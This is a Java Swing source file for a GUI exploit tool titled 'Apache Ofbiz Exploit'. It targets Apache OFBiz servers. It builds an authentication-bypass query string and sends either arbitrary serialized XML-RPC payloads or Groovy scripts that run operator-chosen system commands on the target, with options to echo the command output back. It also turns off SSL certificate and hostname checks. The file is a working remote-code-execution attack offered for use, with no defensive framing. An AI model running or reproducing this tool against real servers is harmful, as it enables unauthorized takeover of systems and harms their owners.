package org.example;

import javax.net.ssl.HttpsURLConnection;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class UI {
    private JPanel root;
    private JTabbedPane tabbedPane1;
    private JTextField textField1;
    private JButton exploitButton;
    private JButton 代理Button;
    public JCheckBox 设置Host头CheckBox;
    public JRadioButton 使用TomcatEcho命令执行RadioButton;
    public JRadioButton 自选反序列化RadioButton;
    public JRadioButton 内存马RadioButton;
    public JTextField whoamiTextField;
    public JTextArea textArea1;
    public JTextArea textArea2;
    private JPanel deseri;
    private JPanel groovy;
    public JTextArea textArea3;
    public JRadioButton parameterErrorEchoRadioButton;
    public JRadioButton noEchoRadioButton;
    public JTextField textField2;
    private JRadioButton usePrintlnToEchoRadioButton;

    public UI() {
        HttpsPostRequestExample httpsPostRequest = new HttpsPostRequestExample();
        httpsPostRequest.UiObject= this;
        try {
            System.setProperty("jsse.enableSNIExtension", "false");
            httpsPostRequest.disableSSLVerification();
           // SSLContext sslContext = SSLContext.getInstance("SSL");
           // sslContext.init(null, new TrustManager[] { new CustomTrustManager() }, null);
            //HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());

        }catch (Exception error){
            JOptionPane.showMessageDialog(null,"初始化错误","警告",1);
            System.exit(-1);
        }

        使用TomcatEcho命令执行RadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                使用TomcatEcho命令执行RadioButton.setSelected(true);
                if(使用TomcatEcho命令执行RadioButton.isSelected()){
                    whoamiTextField.setEnabled(true);
                    textArea1.setEnabled(false);
                    自选反序列化RadioButton.setSelected(false);
                    内存马RadioButton.setSelected(false);
                }
            }
        });
        自选反序列化RadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                自选反序列化RadioButton.setSelected(true);
                if(自选反序列化RadioButton.isSelected()){
                    textArea1.setEnabled(true);
                    whoamiTextField.setEnabled(false);
                    使用TomcatEcho命令执行RadioButton.setSelected(false);
                    内存马RadioButton.setSelected(false);
                }
            }
        });
        内存马RadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                内存马RadioButton.setSelected(true);
                if(内存马RadioButton.isSelected()){
                    whoamiTextField.setEnabled(false);
                    textArea1.setEnabled(false);
                    自选反序列化RadioButton.setSelected(false);
                    使用TomcatEcho命令执行RadioButton.setSelected(false);
                }
            }
        });
        exploitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                URL url =null;
                try {
                    url = new URL(textField1.getText().toString());
                    if(url.getProtocol().equals("https")) {
                        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
                        connection.setHostnameVerifier((hostname, session) -> true);

                    }

                    // 禁用主机名验证


                }catch (Exception error){
                    JOptionPane.showMessageDialog(null,"Please check if the URL is correct","Error",0);
                    return;
                }

                String protocol = url.getProtocol(); // 获取协议
                String host = url.getHost();         // 获取主机（域名或IP地址）
                int port = url.getPort();           // 获取端口号

                // 处理端口号
                if (port == -1) {
                    // 如果端口号为-1，则使用默认端口号，例如 HTTPS 默认端口为 443
                    port = url.getDefaultPort();
                }

                // 合并协议、主机和端口
                String combinedURL = protocol + "://" + host + ":" + port;

                if(deseri.isVisible()){
                   //反序列化
                    String PayloadStart = "<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">";
                    String PayloadEnd = "</serializable></value></member></struct></value></param></params></methodCall>";
                    String Payload = "";
                    if (使用TomcatEcho命令执行RadioButton.isSelected()){
                        Payload = PayloadStart + ""+ PayloadEnd;

                    }else{
                        Payload = PayloadStart +textArea1.getText()+ PayloadEnd;

                    }
                    try {

                        String Resp = httpsPostRequest.sendXMLPayload(combinedURL + "/webtools/control/xmlrpc/?USERNAME&PASSWORD=admin&requirePasswordChange=Y", Payload);
                        //System.out.println(Resp);
                    }catch (Exception error){
                        textArea2.append("请求失败，请检查配置");
                        error.printStackTrace();
                    }



                }else if(groovy.isVisible()){
                    //命令执行
                    String Payload = "";
                    String input = httpsPostRequest.StringConversion(textField2.getText());
                    if(parameterErrorEchoRadioButton.isSelected()){
                        Payload = "import org.apache.ofbiz.entity.util.EntityFindOptions\n" +
                                "def custombaseEncode(String input) {\n" +
                                "    def baseChars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n" +
                                "    def result = \"\"\n" +
                                "\n" +
                                "    byte[] bytes = input.bytes\n" +
                                "\n" +
                                "    for (int i = 0; i < bytes.length; i += 3) {\n" +
                                "        int triple = (bytes[i] & 0xFF) << 16\n" +
                                "        if (i + 1 < bytes.length) triple |= (bytes[i + 1] & 0xFF) << 8\n" +
                                "        if (i + 2 < bytes.length) triple |= bytes[i + 2] & 0xFF\n" +
                                "\n" +
                                "        for (int j = 0; j < 4; j++) {\n" +
                                "            int index = (triple >> (18 - j * 6)) & 0x3F\n" +
                                "            result += baseChars.charAt(index)\n" +
                                "        }\n" +
                                "    }\n" +
                                "    while (result.length() % 4 != 0) {\n" +
                                "        result += \"=\"\n" +
                                "    }\n" +
                                "\n" +
                                "    return result\n" +
                                "}\n" +
                                "\n" +
                                "\n" +
                                "EntityFindOptions findOptions = new EntityFindOptions()\n" +
                                "findOptions.setMaxRows(3)\n" +
                                "def text =  (("+input+").execute().text.toString()) \n" +
                                "def result = \"<command_result>${custombaseEncode(text)}</command_result>\"\n" +
                                "List products = delegator.findList(result, null, null, null, findOptions, false)\n";
                    }else if(noEchoRadioButton.isSelected()){
                        Payload = "import groovy.lang.GroovyShell;\n" +
                                "\n" +
                                "String expression = \"("+input+").execute()\";\n" +
                                "GroovyShell gs = new GroovyShell();\n" +
                                "gs.evaluate(expression);";
                    }else if(parameterErrorEchoRadioButton.isSelected()){
                        Payload = "println ("+input+").execute().text";
                    }
                    try {


                        String Resp = httpsPostRequest.sendGroovy(combinedURL + "/webtools/control/ProgramExport?USERNAME=&PASSWORD=aaaa&requirePasswordChange=Y", "groovyProgram="+URLEncoder.encode(Payload, "UTF-8"));
                    }catch (Exception error){
                        error.printStackTrace();

                    }
                }
            }
        });
        parameterErrorEchoRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                parameterErrorEchoRadioButton.setSelected(true);
                if(parameterErrorEchoRadioButton.isSelected()) {
                    noEchoRadioButton.setSelected(false);
                    usePrintlnToEchoRadioButton.setSelected(false);
                }
            }
        });
        noEchoRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                noEchoRadioButton.setSelected(true);
                if(noEchoRadioButton.isSelected()) {
                    usePrintlnToEchoRadioButton.setSelected(false);
                    parameterErrorEchoRadioButton.setSelected(false);
                }
            }
        });
        usePrintlnToEchoRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                usePrintlnToEchoRadioButton.setSelected(true);
                if(usePrintlnToEchoRadioButton.isSelected()) {
                    noEchoRadioButton.setSelected(false);
                    parameterErrorEchoRadioButton.setSelected(false);
                }
            }
        });
        代理Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JFrame frame = new JFrame("Proxy");

                frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                frame.setContentPane(new Proxy_GUI().panel1);

                frame.setLocationRelativeTo(null);
                frame.pack();
                GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
                Point center = ge.getCenterPoint();
                frame.setLocation(center.x - frame.getWidth() / 2, center.y - frame.getHeight() / 2);


                frame.setVisible(true);
            }
        });
    }

    public static void main(String[] args) {

        JFrame frame = new JFrame("Apache Ofbiz Exploit by:JaneMandy");

        frame.setContentPane(new UI().root);

        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        frame.pack();
        frame.setSize(800,600);
        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        Point center = ge.getCenterPoint();
        frame.setLocation(center.x - frame.getWidth() / 2, center.y - frame.getHeight() / 2);

        frame.setVisible(true);
    }
}
